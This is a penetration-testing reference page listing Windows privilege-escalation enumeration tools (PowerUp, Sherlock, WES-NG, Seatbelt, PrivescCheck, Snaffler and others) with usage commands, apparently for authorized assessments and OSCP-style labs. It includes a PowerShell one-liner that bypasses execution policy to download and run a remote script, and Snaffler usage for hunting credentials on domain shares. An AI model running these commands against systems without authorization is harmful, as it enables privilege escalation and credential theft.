# Tools & Resources

*   [PowerSploit's PowerUp](https://github.com/PowerShellMafia/PowerSploit)

    ```
    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
    ```
* [Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock](https://github.com/rasta-mouse/Watson)
*   [(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities](https://github.com/rasta-mouse/Sherlock)

    ```
    powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
    ```
* [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
*   [Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

    ```
    ./windows-exploit-suggester.py --update
    ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
    ```
* [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
* [WindowsExploits - Windows exploits, mostly precompiled. Not being updated.](https://github.com/abatchy17/WindowsExploits)
* [WindowsEnum - A Powershell Privilege Escalation Enumeration Script.](https://github.com/absolomb/WindowsEnum)
*   [Seatbelt - A C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.](https://github.com/GhostPack/Seatbelt)

    ```
    Seatbelt.exe -group=all -full
    Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"
    Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
    ```
* [Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind](https://github.com/M4ximuss/Powerless)
*   [JAWS - Just Another Windows (Enum) Script](https://github.com/411Hall/JAWS)

    ```
    powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
    ```
* [winPEAS - Windows Privilege Escalation Awesome Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)
*   [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng)

    ```
    # First obtain systeminfo
    systeminfo
    systeminfo > systeminfo.txt
    # Then feed it to wesng
    python3 wes.py --update-wes
    python3 wes.py --update
    python3 wes.py systeminfo.txt
    ```
*   [PrivescCheck - Privilege Escalation Enumeration Script for Windows](https://github.com/itm4n/PrivescCheck)

    ```
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML"
    ```

### Snaffler

[Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.

To execute Snaffler, we can use the command below:

**Snaffler Execution**

```bash
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
```

## Resources

{% embed url="https://fuzzysecurity.com/tutorials/16.html" %}

{% embed url="https://steflan-security.com/windows-privilege-escalation-cheat-sheet/" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" %}

{% embed url="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html" %}

{% embed url="https://github.com/abatchy17/WindowsExploits" %}
